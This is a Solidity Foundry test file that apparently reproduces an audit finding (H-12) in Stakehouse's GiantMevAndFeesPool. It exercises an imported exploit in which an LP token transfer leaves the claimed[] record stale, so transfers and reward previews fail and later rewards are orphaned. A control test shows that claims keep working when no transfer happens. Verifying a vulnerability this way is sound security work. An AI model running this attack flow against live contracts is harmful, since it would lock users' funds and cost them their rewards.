// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "./43034-h-12-sender-transferring-giantmevandfeespool-tokens-can-afte.sol";

/*//////////////////////////////////////////////////////////////
    Stakehouse Protocol - transfer leaves claimed[] high → DOS + orphaned
    rewards (H-12, #43034)

    - test_exploit: full flow via Exploit
    - test_control_noTransferKeepsClaimWorking: without the transfer, further
      claims/previews still work - isolates the missing claimed[from] adjust
//////////////////////////////////////////////////////////////*/
contract GiantLPTransferDOSTest is Test {
    function test_exploit() public {
        Exploit e = new Exploit();
        GiantMevAndFeesPool pool = e.pool();
        User userA = e.userA();
        User userB = e.userB();
        uint256 deposit = e.DEPOSIT();
        uint256 reward1 = e.REWARD1();

        // Fund + deposit
        vm.deal(address(userA), deposit);
        userA.deposit(pool, deposit);
        assertEq(pool.lpTokenETH().balanceOf(address(userA)), deposit);

        // Reward round 1 + legitimate claim
        vm.deal(address(pool), address(pool).balance + reward1);
        userA.claim(pool);
        assertEq(userA.ethReceived(), reward1, "userA claimed full 2 ETH reward");
        assertEq(pool.claimed(address(userA), address(pool.lpTokenETH())), reward1);

        // === attack (inside e.run()): transfer half, then DOS ===
        e.run();

        // Independent re-assert of the DoS (before any further rewards)
        assertEq(pool.lpTokenETH().balanceOf(address(userA)), 4 ether);
        assertEq(pool.claimed(address(userA), address(pool.lpTokenETH())), reward1);
        assertFalse(userA.tryTransferLP(pool.lpTokenETH(), address(userB), 1 ether), "still DoSd");
        (bool ok, ) = userA.tryPreview(pool);
        assertFalse(ok, "preview still reverts");

        // Orphan: second reward round. userB claims their half; userA's preview
        // no longer reverts (entitlement caught up to the stale claimed[]) but
        // returns 0 - the 1 ETH they should have earned is permanently orphaned.
        vm.deal(address(pool), address(pool).balance + 2 ether);
        userB.claim(pool);
        assertEq(userB.ethReceived(), 1 ether, "userB claims their half of round 2");

        (bool ok2, uint256 dueA) = userA.tryPreview(pool);
        assertTrue(ok2, "preview no longer reverts once entitlement catches claimed");
        assertEq(dueA, 0, "userA sees 0 due despite 1 ETH of round-2 rewards being theirs - orphaned");
        assertEq(userA.ethReceived(), 2 ether, "userA never received any of round 2");
    }

    function test_control_noTransferKeepsClaimWorking() public {
        GiantMevAndFeesPool pool = new GiantMevAndFeesPool();
        pool.initLP();
        User solo = new User();

        vm.deal(address(solo), 8 ether);
        solo.deposit(pool, 8 ether);

        vm.deal(address(pool), address(pool).balance + 2 ether);
        solo.claim(pool);
        assertEq(solo.ethReceived(), 2 ether);

        // Without transferring, preview and further claim still work.
        (bool ok, uint256 due) = solo.tryPreview(pool);
        assertTrue(ok, "preview works without transfer");
        assertEq(due, 0, "nothing more owed yet");

        vm.deal(address(pool), address(pool).balance + 2 ether);
        solo.claim(pool);
        assertEq(solo.ethReceived(), 4 ether, "second claim works when claimed[] tracks balance");
    }
}
